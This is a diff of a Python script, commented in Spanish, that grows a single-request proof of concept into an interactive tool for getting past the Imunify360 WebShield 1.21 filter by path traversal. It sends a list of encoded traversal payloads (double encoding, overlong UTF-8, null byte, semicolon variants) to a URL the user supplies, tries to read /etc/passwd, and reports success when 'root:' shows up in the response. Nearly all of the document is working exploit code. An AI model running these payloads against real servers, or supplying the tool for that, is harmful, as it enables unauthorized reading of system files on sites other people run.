@@ -1,19 +1,58 @@
 import requests
 
-# URL objetivo donde está configurado Imunify360 Webshield 1.21
-target_url = 'http://target.com'
+def print_banner():
+    print("=" * 60)
+    print("      Imunify360 WebShield 1.21 Bypass Tester")
+    print("                 m10sec                      ")
+    print("        CVE: Path Traversal Custom Bypass    ")
+    print("=" * 60)
 
-# Ejemplo de bypass codificando caracteres en la URL
-bypass_payload = '/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+# Lista de payloads conocidos para intentar el bypass
+payloads = [
+    "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+    "/%252e%252e/%252e%252e/%252e%252e/etc/passwd",
+    "/..%2f..%2f..%2fetc/passwd",
+    "%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "//..//..//..//etc/passwd",
+    "/..;/..;/..;/etc/passwd",
+    "/../../../../etc/passwd%00",
+    "/../../../../etc/passwd.",
+    "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
+    "/etc/passwd..log",
+    "/etc/passwd;/"
+]
 
-# Construcción de la URL maliciosa
-exploit_url = target_url + bypass_payload
+def test_payloads(base_url):
+    success = False
 
-# Envío de la solicitud maliciosa
-response = requests.get(exploit_url)
+    for payload in payloads:
+        url = base_url.rstrip("/") + payload
+        print(f"\n[>] Probando: {url}")
 
-# Imprimir la respuesta para ver si el bypass fue exitoso
-if "root:" in response.text:
-    print("PoC exitoso: acceso a /etc/passwd logrado")
-else:
-    print("PoC fallido: el filtro sigue activo")
+        try:
+            response = requests.get(url, timeout=10)
+            if "root:" in response.text:
+                print("[✓] Bypass exitoso con payload:")
+                print(payload)
+                success = True
+                break
+            else:
+                print("[x] Filtro activo o no vulnerable.")
+        except requests.exceptions.RequestException as e:
+            print(f"[!] Error de conexión: {e}")
+
+    if not success:
+        print("\n[!] No se encontró ningún bypass exitoso con los payloads disponibles.")
+
+def main():
+    print_banner()
+    target = input("Introduce la URL del objetivo (ej: http://target.com): ").strip()
+
+    if not target.startswith("http://") and not target.startswith("https://"):
+        print("Error: La URL debe comenzar con http:// o https://")
+        return
+
+    test_payloads(target)
+
+if __name__ == "__main__":
+    main()
